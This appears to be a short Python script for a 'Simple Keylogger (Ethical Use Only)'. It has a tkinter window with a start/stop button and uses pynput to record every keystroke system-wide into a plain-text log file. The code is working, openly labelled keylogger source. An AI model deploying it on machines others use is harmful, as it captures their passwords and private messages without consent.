import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import threading
import datetime

# Globals
listener = None
log_file = "key_log.txt"
is_logging = False

# Log keystrokes to file
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key.name}]")

def on_release(key):
    if key == keyboard.Key.esc:
        stop_logging()
        return False

# Start logging in a new thread
def start_logging():
    global listener, is_logging

    if is_logging:
        messagebox.showinfo("Keylogger", "Keylogger is already running.")
        return

    with open(log_file, "a") as f:
        f.write(f"\n\n----- LOGGING STARTED: {datetime.datetime.now()} -----\n")

    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    is_logging = True
    status_label.config(text="🔴 Logging Started", fg="red")

# Stop logging
def stop_logging():
    global listener, is_logging
    if listener is not None:
        listener.stop()
        listener = None
    is_logging = False
    status_label.config(text="🟢 Logging Stopped", fg="green")

# Toggle logging
def toggle_logging():
    if not is_logging:
        start_logging()
    else:
        stop_logging()

# GUI
root = tk.Tk()
root.title("Simple Keylogger (Ethical Use Only)")
root.geometry("350x200")
root.resizable(False, False)

tk.Label(root, text="🛡️ Ethical Keylogger Tool", font=("Arial", 14, "bold")).pack(pady=10)
status_label = tk.Label(root, text="🟢 Logging Stopped", font=("Arial", 12), fg="green")
status_label.pack(pady=10)

toggle_btn = tk.Button(root, text="Start / Stop Logging", font=("Arial", 12),
                       command=toggle_logging, bg="lightblue")
toggle_btn.pack(pady=20)

tk.Label(root, text="Note: Press ESC to stop from keyboard", font=("Arial", 9), fg="gray").pack()

root.mainloop()
